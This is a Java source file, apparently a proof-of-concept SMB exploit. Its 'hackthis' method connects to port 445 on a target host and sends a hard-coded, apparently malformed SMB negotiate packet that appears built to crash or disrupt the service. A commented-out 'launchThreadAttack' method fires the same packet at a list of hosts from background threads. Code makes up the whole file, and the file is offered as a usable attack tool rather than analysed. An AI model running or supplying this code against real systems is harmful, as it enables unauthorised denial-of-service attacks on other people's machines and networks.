package info.lamatricexiste.smbpoc;

import java.io.OutputStream;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;

public class SmbPoc implements Runnable
{
    final private int[] buff = {
        0x00,0x00,0x00,0x90,0xff,0x53,0x4d,0x42,0x72,0x00,0x00,0x00,0x00,0x18,
        0x53,0xc8,0x00,0x26,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
        0xff,0xff,0xff,0xfe,0x00,0x00,0x00,0x00,0x00,0x6d,0x00,0x02,0x50,0x43,
        0x20,0x4e,0x45,0x54,0x57,0x4f,0x52,0x4b,0x20,0x50,0x52,0x4f,0x47,0x52,
        0x41,0x4d,0x20,0x31,0x2e,0x30,0x00,0x02,0x4c,0x41,0x4e,0x4d,0x41,0x4e,
        0x31,0x2e,0x30,0x00,0x02,0x57,0x69,0x6e,0x64,0x6f,0x77,0x73,0x20,0x66,
        0x6f,0x72,0x20,0x57,0x6f,0x72,0x6b,0x67,0x72,0x6f,0x75,0x70,0x73,0x20,
        0x33,0x2e,0x31,0x61,0x00,0x02,0x4c,0x4d,0x31,0x2e,0x32,0x58,0x30,0x30,
        0x32,0x00,0x02,0x4c,0x41,0x4e,0x4d,0x41,0x4e,0x32,0x2e,0x31,0x00,0x02,
        0x4e,0x54,0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00,0x02,0x53,0x4d,
        0x42,0x20,0x32,0x2e,0x30,0x30,0x32,0x00
    };
    private final int           TIMEOUT  =  250;
    private final int           PORT     =  445;
    private InetAddress         host     =  null;
    private String              message  =  null;

    public void run()
    {
        try {
            hackthis(host);
            setMessage(host.getHostAddress() + " sent buffer");
        }
        catch (InterruptedException e) {
            setMessage(e.getMessage());
        }
        catch (Exception e) {
            setMessage(e.getMessage());
        }
    }
    
    public void setMessage(String msg){
        this.message = msg;
    }
    
    public void setHost(InetAddress h){
        this.host = h;
    }

    private void hackthis(InetAddress ipHost) throws Exception {
        Socket s = new Socket();
        s.bind(null);
        s.connect(new InetSocketAddress(ipHost, PORT), TIMEOUT);
        OutputStream out = s.getOutputStream();
        for(int b: buff){
            out.write(b);
        }
        out.close();
        s.close();
    }

/**
 * Thread
 */  
//    public void launchThreadAttack(){
//        for(final InetAddress h : hosts){
//
//            Thread t = new Thread() {
//                public void run(){
//                    messageHandler.sendMessage(Message.obtain(messageHandler, 5)); 
//                    hackthis(h);
//                    messageHandler.sendMessage(Message.obtain(messageHandler, getIpInt(h))); 
//                    messageHandler.sendMessage(Message.obtain(messageHandler, 0)); 
//                }
//            };
//            t.setUncaughtExceptionHandler(new UncaughtExceptionHandler() {
//                @Override
//                public void uncaughtException(Thread thread, Throwable ex) {
//                    messageHandler.sendMessage(Message.obtain(messageHandler, 3)); 
//                }
//            });
//            t.setDaemon(true);
//            try { t.sleep(200); }
//            catch (java.lang.InterruptedException e) {addText(h.getHostAddress() + " " + e.getMessage());}
//            t.start();
//        }
//    }    
/*
 * End Thread
 **/
}
